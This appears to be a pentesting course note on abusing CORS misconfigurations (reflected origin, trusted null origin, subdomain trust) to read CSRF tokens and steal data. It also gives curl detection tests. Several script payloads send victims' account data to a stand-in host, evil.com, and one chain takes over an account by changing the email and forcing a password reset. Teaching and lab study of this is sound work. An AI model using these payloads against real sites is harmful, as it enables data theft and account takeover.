---
tags: [vapt, csrf, cors, intermediate]
difficulty: intermediate
module: "11 - CSRF"
topic: "11.07 CSRF via CORS Misconfiguration"
portswigger_labs: ["CORS vulnerability with basic origin reflection", "CORS vulnerability with trusted null origin", "CORS vulnerability with trusted insecure protocols"]
---

# 11.07 — CSRF via CORS Misconfiguration

## CORS Review: What CORS Does

```
CORS = Cross-Origin Resource Sharing
CORS is an HTTP mechanism that allows/restricts cross-origin reads.

WITHOUT CORS:
  SOP: evil.com can SEND request to bank.com, but CANNOT READ response
  This prevents data theft but NOT CSRF (we don't need to read response for CSRF!)

WITH CORS MISCONFIGURATION:
  evil.com can SEND request AND READ response!
  
  This COMBINED with credentials=include:
  → evil.com can read CSRF tokens from bank.com's pages!
  → Then use those tokens to perform CSRF attacks!
  
  CORS misconfiguration turns CSRF into a powerful data theft AND action attack!
```

---

## The CORS Headers That Matter

```http
CORS RESPONSE HEADERS:
  Access-Control-Allow-Origin: https://evil.com  ← allows evil.com to read!
  Access-Control-Allow-Origin: *                 ← allows everyone (but no creds)
  Access-Control-Allow-Credentials: true         ← allows sending cookies!
  Access-Control-Allow-Methods: GET, POST, PUT   ← allowed methods
  Access-Control-Allow-Headers: Content-Type     ← allowed headers

DANGEROUS COMBINATION:
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Credentials: true
  
  → evil.com can make credentialed requests AND read responses!
  → Full session control for evil.com!
```

---

## Misconfiguration 1 — Reflected Origin

```
VULNERABLE SERVER BEHAVIOR:
  Request:  Origin: https://evil.com
  Response: Access-Control-Allow-Origin: https://evil.com  ← echoed back!
            Access-Control-Allow-Credentials: true
  
  The server reflects whatever origin it receives back in the header!
  This means ANY origin (including evil.com) gets full access!

TEST WITH CURL:
  curl -H "Origin: https://evil.com" https://target.com/api/account
  
  If response contains:
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Credentials: true
  → VULNERABLE!

ATTACK:
  <script>
  fetch('https://target.com/api/account', {credentials: 'include'})
    .then(r => r.json())
    .then(data => {
      // CAN read victim's account data!
      fetch('https://evil.com/steal?data=' + JSON.stringify(data));
    });
  </script>
```

---

## Misconfiguration 2 — Trusted Null Origin

```
WHEN DOES BROWSER SEND null ORIGIN?
  - Sandboxed iframes: <iframe sandbox src="...">
  - Data: URLs: <iframe src="data:text/html,<script>...</script>">
  - File:// URLs (local files)
  - Cross-origin redirects
  - Some browser privacy modes

IF SERVER TRUSTS null ORIGIN:
  Request:  Origin: null
  Response: Access-Control-Allow-Origin: null
            Access-Control-Allow-Credentials: true
  → ANY page that sends null origin can read responses!

ATTACK:
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
          src="data:text/html,
          <script>
            fetch('https://target.com/api/account', {credentials: 'include'})
              .then(r => r.json())
              .then(data => {
                fetch('https://evil.com/steal?d=' + JSON.stringify(data));
              });
          </script>">
  </iframe>
  
  → iframe sends null origin → server trusts it → data leaked!
```

---

## Misconfiguration 3 — Wildcard Origin With Credentials

```
THIS IS INVALID (browsers reject it):
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Credentials: true
  
  Browsers: "You can't allow ALL origins AND send credentials!"
  → Browser blocks the response

BUT STILL TESTABLE:
  Some backend proxies/caches may behave unexpectedly
  Some non-browser clients don't enforce this
  
  For pentesting: test with curl to see server's raw intent:
  curl -H "Origin: https://evil.com" https://target.com/api
  curl -H "Origin: null" https://target.com/api
  
  Then test the null origin trick to achieve similar result.
```

---

## Misconfiguration 4 — Subdomain Wildcard

```
IF SERVER TRUSTS: *.target.com
  → Any subdomain of target.com gets credentials access!
  → If evil.sub.target.com exists (subdomain takeover) → full access!

TRUST OF http:// WHEN SITE IS https://:
  Access-Control-Allow-Origin: http://sub.target.com
  → If attacker can man-in-the-middle http:// subdomain → MITM → steal tokens!
  
TEST WITH BURP:
  Send request with various Origin headers:
  Origin: http://target.com
  Origin: https://sub.target.com
  Origin: https://notevil.target.com
  Origin: https://target.com.evil.com
  Origin: https://attackertarget.com
  
  See which ones get reflected in ACAO header!
```

---

## Chaining CORS + CSRF to Account Takeover

```javascript
// FULL CHAIN: CORS misconfig → read CSRF token → change email → account takeover

// ATTACKER'S PAGE:
<script>
// STEP 1: Read the change-email page (contains CSRF token)
fetch('https://target.com/account/security', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    // STEP 2: Extract CSRF token
    let match = html.match(/name="csrf" value="([^"]+)"/);
    let csrf = match ? match[1] : '';
    
    // STEP 3: Submit the change-email form with victim's CSRF token
    let data = new URLSearchParams();
    data.append('email', 'attacker@evil.com');
    data.append('csrf', csrf);
    
    return fetch('https://target.com/account/change-email', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: data
    });
  })
  .then(() => {
    // STEP 4: Trigger password reset to attacker's email
    fetch('https://target.com/forgot-password', {
      method: 'POST',
      credentials: 'include',
      body: 'email=attacker@evil.com'
    });
  });
</script>
```

---

## Detecting CORS Misconfiguration

```bash
# MANUAL TEST WITH CURL:
curl -v -H "Origin: https://evil.com" \
     -H "Cookie: session=YOUR_SESSION" \
     https://target.com/api/account 2>&1 | grep -i "access-control"

# LOOK FOR:
# Access-Control-Allow-Origin: https://evil.com  ← reflected! Vulnerable!
# Access-Control-Allow-Credentials: true         ← credentials allowed!

# NULL ORIGIN TEST:
curl -v -H "Origin: null" \
     -H "Cookie: session=YOUR_SESSION" \
     https://target.com/api/account 2>&1 | grep -i "access-control"

# SUBDOMAIN TEST:
curl -v -H "Origin: https://sub.target.com" \
     https://target.com/api/account 2>&1 | grep -i "access-control"

# AUTOMATED: Corsy tool
pip install corsy
corsy -u https://target.com -H "Cookie: session=YOUR_SESSION"

# BURP: Active Scanner includes CORS checks
```

---

## Related Notes
- [[02 - Same-Origin Policy and CSRF]] — SOP and CORS basics
- [[05 - CSRF Token Bypass Techniques]] — reading tokens via CORS
- [[09 - CSRF to Account Takeover]] — full exploitation chain
- [[Module 12 - CORS]] — full CORS module
